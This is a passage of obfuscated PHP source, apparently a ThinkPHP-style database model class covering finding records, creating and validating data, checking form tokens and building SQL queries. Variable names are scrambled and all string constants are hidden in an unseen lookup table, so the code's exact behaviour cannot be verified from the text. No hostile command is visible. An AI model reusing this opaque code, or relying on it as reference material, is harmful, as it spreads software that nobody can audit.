$úÎ‡Ÿö[260]) && !1 === strpos($İ„ï¤®ß, $úÎ‡Ÿö[283]) && !1 === strpos($İ„ï¤®ß, $úÎ‡Ÿö[284])) { unset($õá®ü¿[$úÎ‡Ÿö[275]][$İ„ï¤®ß]); } } } $this->_options_filter($õá®ü¿); return $õá®ü¿; } protected function _options_filter(&$§®“†öû) { } protected function _parseType(&$ªÓöı¯, $šî¡â‡) { $«‚¡úÛô =& $_SERVER[ßğøİ]; if (empty($this->options[$«‚¡úÛô[285]][$«‚¡úÛô[4] . $šî¡â‡])) { $Á©ÁáÎÉ = strtolower($this->fields[$«‚¡úÛô[252]][$šî¡â‡]); if (!1 !== strpos($Á©ÁáÎÉ, $«‚¡úÛô[286])) { } elseif (!1 === strpos($Á©ÁáÎÉ, $«‚¡úÛô[287]) && !1 !== strpos($Á©ÁáÎÉ, $«‚¡úÛô[288])) { $ªÓöı¯[$šî¡â‡] = intval($ªÓöı¯[$šî¡â‡]); } elseif (!1 !== strpos($Á©ÁáÎÉ, $«‚¡úÛô[289]) || !1 !== strpos($Á©ÁáÎÉ, $«‚¡úÛô[290])) { $ªÓöı¯[$šî¡â‡] = floatval($ªÓöı¯[$šî¡â‡]); } elseif (!1 !== strpos($Á©ÁáÎÉ, $«‚¡úÛô[291])) { $ªÓöı¯[$šî¡â‡] = (bool) $ªÓöı¯[$šî¡â‡]; } } } public function find($ü„ÎÂ¸ô = array()) { $Éíœ•Ì’ =& $_SERVER[ßğøİ]; if (is_numeric($ü„ÎÂ¸ô) || is_string($ü„ÎÂ¸ô)) { $Ñâ”¾™¼[$this->getPk()] = intval($ü„ÎÂ¸ô); $this->options[$Éíœ•Ì’[275]] = $Ñâ”¾™¼; } $this->options[$Éíœ•Ì’[292]] = 1; $ü„ÎÂ¸ô = $this->_parseOptions(); $äÇ÷°‘œ = $this->db->select($ü„ÎÂ¸ô); if (!1 === $äÇ÷°‘œ) { return !1; } if (empty($äÇ÷°‘œ)) { return null; } $this->data = $äÇ÷°‘œ[0]; $this->_afterFind($this->data, $ü„ÎÂ¸ô); if (!empty($this->options[$Éíœ•Ì’[293]])) { return $this->returnResult($this->data, $this->options[$Éíœ•Ì’[293]]); } return $this->data; } protected function _afterFind(&$ß±Ÿ´½¨, $¬Å¤ç—™) { } protected function returnResult($¸â‡ÑÄ, $Ö“§ÃÃ = '') { $ïÄ÷–«· =& $_SERVER[ßğøİ]; if ($Ö“§ÃÃ) { if (is_callable($Ö“§ÃÃ)) { return call_user_func($Ö“§ÃÃ, $¸â‡ÑÄ); } switch (strtolower($Ö“§ÃÃ)) { case $ïÄ÷–«·[294]: return json_encode($¸â‡ÑÄ); case $ïÄ÷–«·[295]: return xml_encode($¸â‡ÑÄ); } } return $¸â‡ÑÄ; } public function parseFieldsMap($£âŞèçê, $ÑŠÆƒ”± = 1) { if (!empty($this->_map)) { foreach ($this->_map as $÷‹÷ê´­ => $Ú”Ì«Œ) { if ($ÑŠÆƒ”± == 1) { if (isset($£âŞèçê[$Ú”Ì«Œ])) { $£âŞèçê[$÷‹÷ê´­] = $£âŞèçê[$Ú”Ì«Œ]; unset($£âŞèçê[$Ú”Ì«Œ]); } } else { if (isset($£âŞèçê[$÷‹÷ê´­])) { $£âŞèçê[$Ú”Ì«Œ] = $£âŞèçê[$÷‹÷ê´­]; unset($£âŞèçê[$÷‹÷ê´­]); } } } } return $£âŞèçê; } public function setField($êÚ¥Æ¥ö, $Õİñï³â = '') { if (is_array($êÚ¥Æ¥ö)) { $›òòò­Ù = $êÚ¥Æ¥ö; } else { $›òòò­Ù[$êÚ¥Æ¥ö] = $Õİñï³â; } return $this->save($›òòò­Ù); } public function setAdd($´ñ­çŞ½, $´ëŠ¾ÔÃ = 1) { $¯°òµÂÛ =& $_SERVER[ßğøİ]; $ˆ¶²³¼‹ = $´ñ­çŞ½ . $¯°òµÂÛ[296] . $´ëŠ¾ÔÃ; if ($´ëŠ¾ÔÃ < 0) { $ˆ¶²³¼‹ = $´ñ­çŞ½ . $´ëŠ¾ÔÃ; } return $this->setField($´ñ­çŞ½, array($¯°òµÂÛ[297], $ˆ¶²³¼‹)); } public function getField($®àÇÔ‰¬, $ôËä¹ûİ = null) { $‰ùé²ä° =& $_SERVER[ßğøİ]; $Ü…ƒì®°[$‰ùé²ä°[273]] = $®àÇÔ‰¬; $Ü…ƒì®° = $this->_parseOptions($Ü…ƒì®°); $®àÇÔ‰¬ = trim($®àÇÔ‰¬); if (strpos($®àÇÔ‰¬, $‰ùé²ä°[50])) { if (!isset($Ü…ƒì®°[$‰ùé²ä°[292]])) { $Ü…ƒì®°[$‰ùé²ä°[292]] = is_numeric($ôËä¹ûİ) ? $ôËä¹ûİ : $‰ùé²ä°[12]; } $Š²”ëò = $this->db->select($Ü…ƒì®°); if (!empty($Š²”ëò)) { $Œ¿³…ó´ = explode($‰ùé²ä°[50], $®àÇÔ‰¬); $®àÇÔ‰¬ = array_keys($Š²”ëò[0]); $ì–ˆèù– = array_shift($®àÇÔ‰¬); $˜·çÉùª = array_shift($®àÇÔ‰¬); $««¬é°» = array(); $‘®¿¢¢õ = count($Œ¿³…ó´); foreach ($Š²”ëò as $ğ©¤¦Ê) { $®­½ = $ğ©¤¦Ê[$ì–ˆèù–]; if (2 == $‘®¿¢¢õ) { $««¬é°»[$®­½] = $ğ©¤¦Ê[$˜·çÉùª]; } else { $««¬é°»[$®­½] = is_string($ôËä¹ûİ) ? implode($ôËä¹ûİ, $ğ©¤¦Ê) : $ğ©¤¦Ê; } } return $««¬é°»; } } else { if (!0 !== $ôËä¹ûİ) { $Ü…ƒì®°[$‰ùé²ä°[292]] = is_numeric($ôËä¹ûİ) ? $ôËä¹ûİ : 1; } if ($ôËä¹ûİ === $‰ùé²ä°[255]) { unset($Ü…ƒì®°[$‰ùé²ä°[292]]); } $ğ©¤¦Ê = $this->db->select($Ü…ƒì®°); if (!empty($ğ©¤¦Ê)) { if ($ôËä¹ûİ === $‰ùé²ä°[255]) { return reset($ğ©¤¦Ê[0]); } if (!0 !== $ôËä¹ûİ && 1 == $Ü…ƒì®°[$‰ùé²ä°[292]]) { return reset($ğ©¤¦Ê[0]); } foreach ($ğ©¤¦Ê as $³êÃã) { $™ñÁ¥Úİ[] = $³êÃã[$®àÇÔ‰¬]; } return $™ñÁ¥Úİ; } } return null; } public function create($Ö­Ä³Øø = '', $øƒ‰Œ—Ú = '') { $îß²–Â =& $_SERVER[ßğøİ]; if (empty($Ö­Ä³Øø)) { $Ö­Ä³Øø = $_POST; } elseif (is_object($Ö­Ä³Øø)) { $Ö­Ä³Øø = get_object_vars($Ö­Ä³Øø); } if (empty($Ö­Ä³Øø) || !is_array($Ö­Ä³Øø)) { $this->error = think_lang($îß²–Â[271]); return !1; } $Ö­Ä³Øø = $this->parseFieldsMap($Ö­Ä³Øø, 0); $øƒ‰Œ—Ú = $øƒ‰Œ—Ú ? $øƒ‰Œ—Ú : (!empty($Ö­Ä³Øø[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$îß²–Â[273]])) { $äñšÍüİ = $this->options[$îß²–Â[273]]; unset($this->options[$îß²–Â[273]]); } elseif ($øƒ‰Œ—Ú == THINK_MODEL_INSERT && isset($this->insertFields)) { $äñšÍüİ = $this->insertFields; } elseif ($øƒ‰Œ—Ú == THINK_MODEL_UPDATE && isset($this->updateFields)) { $äñšÍüİ = $this->updateFields; } if (isset($äñšÍüİ)) { if (is_string($äñšÍüİ)) { $äñšÍüİ = explode($îß²–Â[50], $äñšÍüİ); } if (think_config($îß²–Â[298])) { $äñšÍüİ[] = think_config($îß²–Â[299]); } foreach ($Ö­Ä³Øø as $òàñ´Å => $½Ø¾¯ğ) { if (!in_array($òàñ´Å, $äñšÍüİ)) { unset($Ö­Ä³Øø[$òàñ´Å]); } } } if (!$this->autoValidation($Ö­Ä³Øø, $øƒ‰Œ—Ú)) { return !1; } if (!$this->autoCheckToken($Ö­Ä³Øø)) { $this->error = think_lang($îß²–Â[300]); return !1; } if ($this->autoCheckFields) { $äñšÍüİ = $this->getDbFields(); foreach ($Ö­Ä³Øø as $òàñ´Å => $½Ø¾¯ğ) { if (!in_array($òàñ´Å, $äñšÍüİ)) { unset($Ö­Ä³Øø[$òàñ´Å]); } elseif (MAGIC_QUOTES_GPC && is_string($½Ø¾¯ğ)) { $Ö­Ä³Øø[$òàñ´Å] = stripslashes($½Ø¾¯ğ); } } } $this->autoOperation($Ö­Ä³Øø, $øƒ‰Œ—Ú); $this->data = $Ö­Ä³Øø; return $Ö­Ä³Øø; } public function autoCheckToken($´ê”Œ“¶) { $ëı… –© =& $_SERVER[ßğøİ]; if (isset($this->options[$ëı… –©[301]]) && !$this->options[$ëı… –©[301]]) { return !0; } if (think_config($ëı… –©[298])) { $šäš¢°– = think_config($ëı… –©[299]); if (!isset($´ê”Œ“¶[$šäš¢°–]) || Session::get($šäš¢°–)) { return !1; } list($úÌÒë—±, $Ä“Õú§È) = explode($ëı… –©[11], $´ê”Œ“¶[$šäš¢°–]); if ($Ä“Õú§È && Session::get($šäš¢°– . $ëı… –©[10] . $úÌÒë—±) === $Ä“Õú§È) { Session::remove($šäš¢°– . $ëı… –©[10] . $úÌÒë—±); return !0; } if (think_config($ëı… –©[302])) { Session::remove($šäš¢°– . $ëı… –©[10] . $úÌÒë—±); } return !1; } return !0; } public function regex($â¶Ë˜Ó±, $ïÆØ‘†¯) { $şÊ¯åÖÎ =& $_SERVER[ßğøİ]; $Ã»òÚÚ = array($şÊ¯åÖÎ[303] => $şÊ¯åÖÎ[304], $şÊ¯åÖÎ[305] => $şÊ¯åÖÎ[306], $şÊ¯åÖÎ[307] => $şÊ¯åÖÎ[308], $şÊ¯åÖÎ[309] => $şÊ¯åÖÎ[310], $şÊ¯åÖÎ[311] => $şÊ¯åÖÎ[312], $şÊ¯åÖÎ[313] => $şÊ¯åÖÎ[314], $şÊ¯åÖÎ[315] => $şÊ¯åÖÎ[316], $şÊ¯åÖÎ[290] => $şÊ¯åÖÎ[317], $şÊ¯åÖÎ[318] => $şÊ¯åÖÎ[319]); if (isset($Ã»òÚÚ[strtolower($ïÆØ‘†¯)])) { $ïÆØ‘†¯ = $Ã»òÚÚ[strtolower($ïÆØ‘†¯)]; } return preg_match($ïÆØ‘†¯, $â¶Ë˜Ó±) === 1; } private function autoOperation(&$ÆÑ÷¸‚, $ƒöÒ‘¬É) { $ªş¥˜§­ =& $_SERVER[ßğøİ]; if (!empty($this->options[$ªş¥˜§­[320]])) { $ĞÜµıô‰ = $this->options[$ªş¥˜§­[320]]; unset($this->options[$ªş¥˜§­[320]]); } elseif (!empty($this->_auto)) { $ĞÜµıô‰ = $this->_auto; } if (isset($ĞÜµıô‰)) { foreach ($ĞÜµıô‰ as $Ö»Ã¼ÅÔ) { if (empty($Ö»Ã¼ÅÔ[2])) { $Ö»Ã¼ÅÔ[2] = THINK_MODEL_INSERT; } if ($ƒöÒ‘¬É == $Ö»Ã¼ÅÔ[2] || $Ö»Ã¼ÅÔ[2] == THINK_MODEL_BOTH) { switch (trim($Ö»Ã¼ÅÔ[3])) { case $ªş¥˜§­[321]: case $ªş¥˜§­[322]: $òˆó„òÑ = isset($Ö»Ã¼ÅÔ[4]) ? (array) $Ö»Ã¼ÅÔ[4] : array(); if (isset($ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]])) { array_unshift($òˆó„òÑ, $ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]]); } if ($ªş¥˜§­[321] == $Ö»Ã¼ÅÔ[3]) { $ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]] = call_user_func_array($Ö»Ã¼ÅÔ[1], $òˆó„òÑ); } else { $ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]] = call_user_func_array(array(&$this, $Ö»Ã¼ÅÔ[1]), $òˆó„òÑ); } break; case $ªş¥˜§­[273]: $ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]] = $ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[1]]; break; case $ªş¥˜§­[323]: if ($ªş¥˜§­[12] === $ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]]) { unset($ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]]); } break; case $ªş¥˜§­[324]: default: $ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]] = $Ö»Ã¼ÅÔ[1]; } if (!1 === $ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]]) { unset($ÆÑ÷¸‚[$Ö»Ã¼ÅÔ[0]]); } } } } return $ÆÑ÷¸‚; } protected function autoValidation($…ÑçÑ†á, $¹Ê ùêÑ) { $¦ü›öéÉ =& $_SERVER[ßğøİ]; if (!empty($this->options[$¦ü›öéÉ[325]])) { $˜ö¢¾ÀÖ = $this->options[$¦ü›öéÉ[325]]; unset($this->options[$¦ü›öéÉ[325]]); } elseif (!empty($this->_validate)) { $˜ö¢¾ÀÖ = $this->_validate; } if (isset($˜ö¢¾ÀÖ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($˜ö¢¾ÀÖ as $ÕÆÕï ê => $ƒº‚Œ) { if (empty($ƒº‚Œ[5]) || $ƒº‚Œ[5] == THINK_MODEL_BOTH || $ƒº‚Œ[5] == $¹Ê ùêÑ) { if (0 == strpos($ƒº‚Œ[2], $¦ü›öéÉ[326]) && strpos($ƒº‚Œ[2], $¦ü›öéÉ[327])) { $ƒº‚Œ[2] = think_lang(substr($ƒº‚Œ[2], 2, -1)); } $ƒº‚Œ[3] = isset($ƒº‚Œ[3]) ? $ƒº‚Œ[3] : THINK_EXISTS_VALIDATE; $ƒº‚Œ[4] = isset($ƒº‚Œ[4]) ? $ƒº‚Œ[4] : $¦ü›öéÉ[328]; switch ($ƒº‚Œ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($…ÑçÑ†á, $ƒº‚Œ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¦ü›öéÉ[12] != trim($…ÑçÑ†á[$ƒº‚Œ[0]])) { if (!1 === $this->_validationField($…ÑçÑ†á, $ƒº‚Œ)) { return !1; } } break; default: if (isset($…ÑçÑ†á[$ƒº‚Œ[0]])) { if (!1 === $this->_validationField($…ÑçÑ†á, $ƒº‚Œ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¸¢‚ØØ÷, $ê÷¹Ìš¶) { if (!1 === $this->_validationFieldItem($¸¢‚ØØ÷, $ê÷¹Ìš¶)) { if ($this->patchValidate) { $this->error[$ê÷¹Ìš¶[0]] = $ê÷¹Ìš¶[2]; } else { $this->error = $ê÷¹Ìš¶[2]; return !1; } } return; } protected function _validationFieldItem($ïÄ¦»Ğµ, $ÜÓ×²£Š) { $ûÅ©ùî =& $_SERVER[ßğøİ]; switch (strtolower(trim($ÜÓ×²£Š[4]))) { case $ûÅ©ùî[321]: case $ûÅ©ùî[322]: $´ò‡á©„ = isset($ÜÓ×²£Š[6]) ? (array) $ÜÓ×²£Š[6] : array(); if (is_string($ÜÓ×²£Š[0]) && strpos($ÜÓ×²£Š[0], $ûÅ©ùî[50])) { $ÜÓ×²£Š[0] = explode($ûÅ©ùî[50], $ÜÓ×²£Š[0]); } if (is_array($ÜÓ×²£Š[0])) { foreach ($ÜÓ×²£Š[0] as $ùæ–º›œ) { $„¥Çäó€[$ùæ–º›œ] = $ïÄ¦»Ğµ[$ùæ–º›œ]; } array_unshift($´ò‡á©„, $„¥Çäó€); } else { array_unshift($´ò‡á©„, $ïÄ¦»Ğµ[$ÜÓ×²£Š[0]]); } if ($ûÅ©ùî[321] == $ÜÓ×²£Š[4]) { return call_user_func_array($ÜÓ×²£Š[1], $´ò‡á©„); } else { return call_user_func_array(array(&$this, $ÜÓ×²£Š[1]), $´ò‡á©„); } case $ûÅ©ùî[329]: return $ïÄ¦»Ğµ[$ÜÓ×²£Š[0]] == $ïÄ¦»Ğµ[$ÜÓ×²£Š[1]]; case $ûÅ©ùî[330]: if (is_string($ÜÓ×²£Š[0]) && strpos($ÜÓ×²£Š[0], $ûÅ©ùî[50])) { $ÜÓ×²£Š[0] = explode($ûÅ©ùî[50], $ÜÓ×²£Š[0]); } $µºóø˜ä = array(); if (is_array($ÜÓ×²£Š[0])) { foreach ($ÜÓ×²£Š[0] as $ùæ–º›œ) { $µºóø˜ä[$ùæ–º›œ] = $ïÄ¦»Ğµ[$ùæ–º›œ]; } } else { $µºóø˜ä[$ÜÓ×²£Š[0]] = $ïÄ¦»Ğµ[$ÜÓ×²£Š[0]]; } if (!empty($ïÄ¦»Ğµ[$this->getPk()])) { $µºóø˜ä[$this->getPk()] = array($ûÅ©ùî[331], $ïÄ¦»Ğµ[$this->getPk()]); } if ($this->where($µºóø˜ä)->find()) { return !1; } return !0; default: return $this->check($ïÄ¦»Ğµ[$ÜÓ×²£Š[0]], $ÜÓ×²£Š[1], $ÜÓ×²£Š[4]); } } public function check($›é”‘Ê¹, $““›ì‹õ, $œÍ™ü´¢ = "\162\x65\147\x65\170") { $Ó–íì =& $_SERVER[ßğøİ]; $œÍ™ü´¢ = strtolower(trim($œÍ™ü´¢)); switch ($œÍ™ü´¢) { case $Ó–íì[7]: case $Ó–íì[332]: $±Ğ¤òÚÔ = is_array($““›ì‹õ) ? $““›ì‹õ : explode($Ó–íì[50], $““›ì‹õ); return $œÍ™ü´¢ == $Ó–íì[7] ? in_array($›é”‘Ê¹, $±Ğ¤òÚÔ) : !in_array($›é”‘Ê¹, $±Ğ¤òÚÔ); case $Ó–íì[333]: case $Ó–íì[334]: if (is_array($““›ì‹õ)) { $äšñÅ¤– = $““›ì‹õ[0]; $„‚òØÄÙ = $““›ì‹õ[1]; } else { list($äšñÅ¤–, $„‚òØÄÙ) = explode($Ó–íì[50], $““›ì‹õ); } return $œÍ™ü´¢ == $Ó–íì[333] ? $›é”‘Ê¹ >= $äšñÅ¤– && $›é”‘Ê¹ <= $„‚òØÄÙ : $›é”‘Ê¹ < $äšñÅ¤– || $›é”‘Ê¹ > $„‚òØÄÙ; case $Ó–íì[335]: case $Ó–íì[336]: return $œÍ™ü´¢ == $Ó–íì[335] ? $›é”‘Ê¹ == $““›ì‹õ : $›é”‘Ê¹ != $““›ì‹õ; case $Ó–íì[337]: $®·©Ì¡½ = mb_strlen($›é”‘Ê¹, $Ó–íì[338]); if (strpos($““›ì‹õ, $Ó–íì[50])) { list($äšñÅ¤–, $„‚òØÄÙ) = explode($Ó–íì[50], $““›ì‹õ); return $®·©Ì¡½ >= $äšñÅ¤– && $®·©Ì¡½ <= $„‚òØÄÙ; } else { return $®·©Ì¡½ == $““›ì‹õ; } case $Ó–íì[339]: list($Ûó¼ÎûÜ, $ñäÇúÜ) = explode($Ó–íì[50], $““›ì‹õ); if (!is_numeric($Ûó¼ÎûÜ)) { $Ûó¼ÎûÜ = strtotime($Ûó¼ÎûÜ); } if (!is_numeric($ñäÇúÜ)) { $ñäÇúÜ = strtotime($ñäÇúÜ); } return NOW_TIME >= $Ûó¼ÎûÜ && NOW_TIME <= $ñäÇúÜ; case $Ó–íì[340]: return in_array(get_client_ip(), explode($Ó–íì[50], $““›ì‹õ)); case $Ó–íì[341]: return !in_array(get_client_ip(), explode($Ó–íì[50], $““›ì‹õ)); case $Ó–íì[328]: default: return $this->regex($›é”‘Ê¹, $““›ì‹õ); } } public function query($…øã¬”¯, $¦öˆë™© = false) { $âÍÜÂÈ¯ =& $_SERVER[ßğøİ]; if (!is_bool($¦öˆë™©) && !is_array($¦öˆë™©)) { $¦öˆë™© = func_get_args(); array_shift($¦öˆë™©); } $…øã¬”¯ = str_replace(array($âÍÜÂÈ¯[231], $âÍÜÂÈ¯[342]), $âÍÜÂÈ¯[53], $…øã¬”¯); $…øã¬”¯ = $this->parseSql($…øã¬”¯, $¦öˆë™©); return $this->db->query($…øã¬”¯); } public function execute($¶àê®ª“, $ª×Ââı¾ = false) { if (!is_bool($ª×Ââı¾) && !is_array($ª×Ââı¾)) { $ª×Ââı¾ = func_get_args(); array_shift($ª×Ââı¾); } $¶àê®ª“ = $this->parseSql($¶àê®ª“, $ª×Ââı¾); return $this->db->execute($¶àê®ª“); } protected function parseSql($Ÿ±š•ß, $’šÍá¤à) { $Ğì¼¾¸€ =& $_SERVER[ßğøİ]; if (!0 === $’šÍá¤à) { $óõ¼“ñ† = $this->_parseOptions(); $Ÿ±š•ß = $this->db->parseSql($Ÿ±š•ß, $óõ¼“ñ†); } elseif (is_array($’šÍá¤à)) { $’šÍá¤à = array_map(array($this->db, $Ğì¼¾¸€[343]), $’šÍá¤à); $Ÿ±š•ß = vsprintf($Ÿ±š•ß, $’šÍá¤à); } else { $Ÿ±š•ß = strtr($Ÿ±š•ß, array($Ğì¼¾¸€[344] => $this->getTableName(), $Ğì¼¾¸€[345] => think_config($Ğì¼¾¸€[244]))); } $this->db->setModel($this->name); return $Ÿ±š•ß; } public function db($¾¦ùø² = '', $–Ûñ±¶á = '', $·ù©ÖïÓ = array()) { $Â­ÁŠôâ =& $_SERVER[ßğøİ]; if ($Â­ÁŠôâ[12] === $¾¦ùø² && $this->db) { return $this->db; } static $Ôœ«¦Ïİ = array(); static $¥½ƒ­‹Ã = array(); if (!isset($¥½ƒ­‹Ã[$¾¦ùø²]) || isset($¥½ƒ­‹Ã[$¾¦ùø²]) && $–Ûñ±¶á && $Ôœ«¦Ïİ[$¾¦ùø²] != $–Ûñ±¶á) { if (!empty($–Ûñ±¶á) && is_string($–Ûñ±¶á) && !1 === strpos($–Ûñ±¶á, $Â­ÁŠôâ[8])) { $–Ûñ±¶á = think_config($–Ûñ±¶á); } $¾¦ùø² = think_guid($–Ûñ±¶á); $¥½ƒ­‹Ã[$¾¦ùø²] = Db::getInstance($–Ûñ±¶á); } elseif (NULL === $–Ûñ±¶á) { $¥½ƒ­‹Ã[$¾¦ùø²]->close(); unset($¥½ƒ­‹Ã[$¾¦ùø²]); return; } if (!empty($·ù©ÖïÓ)) { if (is_string($·ù©ÖïÓ)) { parse_str($·ù©ÖïÓ, $·ù©ÖïÓ); } foreach ($·ù©ÖïÓ as $ôİÒ„±É => $óÑïûÕÏ) { $this->setProperty($ôİÒ„±É, $óÑïûÕÏ); } } $Ôœ«¦Ïİ[$¾¦ùø²] = $–Ûñ±¶á; $this->db = $¥½ƒ­‹Ã[$¾¦ùø²]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÁÛ•ö×¡ = get_class($this); if ($ÁÛ•ö×¡ == $_SERVER[ßğøİ][346]) { return $this->name; } $this->name = substr($ÁÛ•ö×¡, 0, -5); } return $this->name; } public function getTableName() { $Ã¾ç‚Ü‹ =& $_SERVER[ßğøİ]; if (empty($this->trueTableName)) { $Æ›Óäë¹ = !empty($this->tablePrefix) ? $this->tablePrefix : $Ã¾ç‚Ü‹[12]; if (!empty($this->tableName)) { $Æ›Óäë¹ .= $this->tableName; } else { $Æ›Óäë¹ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Æ›Óäë¹); } return (!empty($this->dbName) ? $this->dbName . $Ã¾ç‚Ü‹[10] : $Ã¾ç‚Ü‹[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÀÑÑ«ç =& $_SERVER[ßğøİ]; return isset($this->fields[$ÀÑÑ«ç[251]]) ? $this->fields[$ÀÑÑ«ç[251]] : $this->pk; } public function getDbFields() { $ì”¾‰õ¬ =& $_SERVER[ßğøİ]; if (isset($this->options[$ì”¾‰õ¬[279]])) { $ååìŞŠà = $this->db->getFields($this->options[$ì”¾‰õ¬[279]]); return $ååìŞŠà ? array_keys($ååìŞŠà) : !1; } if ($this->fields) { $ååìŞŠà = $this->fields; unset($ååìŞŠà[$ì”¾‰õ¬[250]], $ååìŞŠà[$ì”¾‰õ¬[251]], $ååìŞŠà[$ì”¾‰õ¬[252]], $ååìŞŠà[$ì”¾‰õ¬[249]]); return $ååìŞŠà; } return !1; } public function data($‹ƒ›€²Ì = '') { $š‰§£· =& $_SERVER[ßğøİ]; if ($š‰§£·[12] === $‹ƒ›€²Ì && !empty($this->data)) { return $this->data; } if (is_object($‹ƒ›€²Ì)) { $‹ƒ›€²Ì = get_object_vars($‹ƒ›€²Ì); } elseif (is_string($‹ƒ›€²Ì)) { parse_str($‹ƒ›€²Ì, $‹ƒ›€²Ì); } elseif (!is_array($‹ƒ›€²Ì)) { think_exception(think_lang($š‰§£·[271])); } $this->data = $‹ƒ›€²Ì; return $this; } public function join($›Ÿ°×Áª) { $ñ´„æµ‰ =& $_SERVER[ßğøİ]; if (is_array($›Ÿ°×Áª)) { $this->options[$ñ´„æµ‰[282]] = $›Ÿ°×Áª; } elseif (!empty($›Ÿ°×Áª)) { $this->options[$ñ´„æµ‰[282]][] = $›Ÿ°×Áª; } return $this; } public function union($»¬Ñ‚–İ, $­‡Å•»½ = false) { $÷ïş£ÅÄ =& $_SERVER[ßğøİ]; if (empty($»¬Ñ‚–İ)) { return $this; } if ($­‡Å•»½) { $this->options[$÷ïş£ÅÄ[347]][$÷ïş£ÅÄ[348]] = !0; } if (is_object($»¬Ñ‚–İ)) { $»¬Ñ‚–İ = get_object_vars($»¬Ñ‚–İ); } if (is_string($»¬Ñ‚–İ)) { $ïÈ×–‚ = $»¬Ñ‚–İ; } elseif (is_array($»¬Ñ‚–İ)) { if (isset($»¬Ñ‚–İ[0])) { $this->options[$÷ïş£ÅÄ[347]] = array_merge($this->options[$÷ïş£ÅÄ[347]], $»¬Ñ‚–İ); return $this; } else { $ïÈ×–‚ = $»¬Ñ‚–İ; } } else { think_exception(think_lang($÷ïş£ÅÄ[271])); } $this->options[$÷ïş£ÅÄ[347]][] = $ïÈ×–‚; return $this; } public function cache($şºÇ©–‡ = true, $Š†ç¹É„ = null, $¸ëı¤Ù = '') { $ÅÙ•¹ÕÊ =& $_SERVER[ßğøİ]; if (!1 !== $şºÇ©–‡) { $this->options[$ÅÙ•¹ÕÊ[349]] = array($ÅÙ•¹ÕÊ[94] => $şºÇ©–‡, $ÅÙ•¹ÕÊ[339] => $Š†ç¹É„, $ÅÙ•¹ÕÊ[33] => $¸ëı¤Ù); } return $this; } public function field($ºš¨şù, $¬»–Ë­Ñ = false) { $İ×Ùåºß =& $_SERVER[ßğøİ]; if (!0 === $ºš¨şù) { $ ø•”¦è = $this->getDbFields(); $ºš¨şù = $ ø•”¦è ? $ ø•”¦è : $İ×Ùåºß[188]; } elseif ($¬»–Ë­Ñ) { if (is_string($ºš¨şù)) { $ºš¨şù = explode($İ×Ùåºß[50], $ºš¨şù); } $ ø•”¦è = $this->getDbFields(); $ºš¨şù = $ ø•”¦è ? array_diff($ ø•”¦è, $ºš¨şù) : $ºš¨şù; } $this->options[$İ×Ùåºß[273]] = $ºš¨şù; return $this; } public function scope($â®¯´üÖ = '', $‘°Êí = NULL) { $¡ÃØÊìĞ =& $_SERVER[ßğøİ]; if ($¡ÃØÊìĞ[12] === $â®¯´üÖ) { if (isset($this->_scope[$¡ÃØÊìĞ[37]])) { $°Ä“ÔøŠ = $this->_scope[$¡ÃØÊìĞ[37]]; } else { return $this; } } elseif (is_string($â®¯´üÖ)) { $‰ç¼ä = explode($¡ÃØÊìĞ[50], $â®¯´üÖ); $°Ä“ÔøŠ = array(); foreach ($‰ç¼ä as $İ……üÊ«) { if (!isset($this->_scope[$İ……üÊ«])) { continue; } $°Ä“ÔøŠ = array_merge($°Ä“ÔøŠ, $this->_scope[$İ……üÊ«]); } if (!empty($‘°Êí) && is_array($‘°Êí)) { $°Ä“ÔøŠ = array_merge($°Ä“ÔøŠ, $‘°Êí); } } elseif (is_array($â®¯´üÖ)) { $°Ä“ÔøŠ = $â®¯´üÖ; } if (is_array($°Ä“ÔøŠ) && !empty($°Ä“ÔøŠ)) { $this->options = array_merge($this->options, array_change_key_case($°Ä“ÔøŠ)); } return $this; } public function where($ç‹Æ…åæ, $…Şâ‹¾Ô = null) { $Äêäş†× =& $_SERVER[ßğøİ]; if (!is_null($…Şâ‹¾Ô) && is_string($ç‹Æ…åæ)) { if (!is_array($…Şâ‹¾Ô)) { $…Şâ‹¾Ô = func_get_args(); array_shift($…Şâ‹¾Ô); } $…Şâ‹¾Ô = array_map(array($this->db, $Äêäş†×[343]), $…Şâ‹¾Ô); $ç‹Æ…åæ = vsprintf($ç‹Æ…åæ, $…Şâ‹¾Ô); } elseif (is_object($ç‹Æ…åæ)) { $ç‹Æ…åæ = get_object_vars($ç‹Æ…åæ); } elseif (is_array($ç‹Æ…åæ)) { foreach ($ç‹Æ…åæ as $ÃÚÓç¤º => $Ïç”œê¼) { if ((is_numeric($ÃÚÓç¤º) || !$ÃÚÓç¤º) && is_string($Ïç”œê¼)) { if (strpos($Ïç”œê¼, $Äêäş†×[350]) === 0) { continue; } think_trace($Äêäş†×[351], $Äêäş†×[12], $Äêäş†×[49]); die; } } } if (is_string($ç‹Æ…åæ) && $Äêäş†×[12] != $ç‹Æ…åæ) { $å•­†İÊ = array(); $å•­†İÊ[$Äêäş†×[352]] = $ç‹Æ…åæ; $ç‹Æ…åæ = $å•­†İÊ; } if (isset($this->options[$Äêäş†×[275]])) { $this->options[$Äêäş†×[275]] = array_merge($this->options[$Äêäş†×[275]], $ç‹Æ…åæ); } else { $this->options[$Äêäş†×[275]] = 